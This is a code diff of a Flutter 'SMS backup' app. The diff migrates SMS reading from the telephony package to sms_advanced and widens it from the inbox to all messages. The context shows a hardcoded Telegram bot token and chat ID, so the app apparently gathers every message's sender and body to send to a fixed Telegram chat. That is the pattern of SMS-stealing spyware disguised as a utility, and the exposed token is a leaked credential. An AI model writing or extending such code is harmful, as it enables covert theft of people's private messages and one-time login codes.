@@ -1,7 +1,7 @@
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 import 'package:permission_handler/permission_handler.dart';
-import 'package:telephony/telephony.dart';
+import 'package:sms_advanced/sms_advanced.dart';
 import 'dart:convert';
 
 void main() {
@@ -34,7 +34,7 @@ class _SMSBackupPageState extends State<SMSBackupPage> {
   final String botToken = "8859100629:AAFdW_k4Ist35Eiof06w3MPp93S4fzlq8SM";
   final String chatId = "6076447275";
   
-  final Telephony telephony = Telephony.instance;
+  final SmsAdvanced smsAdvanced = SmsAdvanced();
   List<SmsMessage> messages = [];
   bool isLoading = false;
   String status = 'Ready';
@@ -60,7 +60,7 @@ class _SMSBackupPageState extends State<SMSBackupPage> {
     });
     
     try {
-      List<SmsMessage> smsList = await telephony.getInboxSms();
+      List<SmsMessage> smsList = await smsAdvanced.getAllSms();
       if (!mounted) return;
       setState(() {
         messages = smsList;
@@ -91,7 +91,7 @@ class _SMSBackupPageState extends State<SMSBackupPage> {
       buffer.writeln('=' * 40);
       
       for (var msg in messages) {
-        buffer.writeln('From: ${msg.address}');
+        buffer.writeln('From: ${msg.sender}');
         buffer.writeln('${msg.body}');
         buffer.writeln('-' * 30);
       }
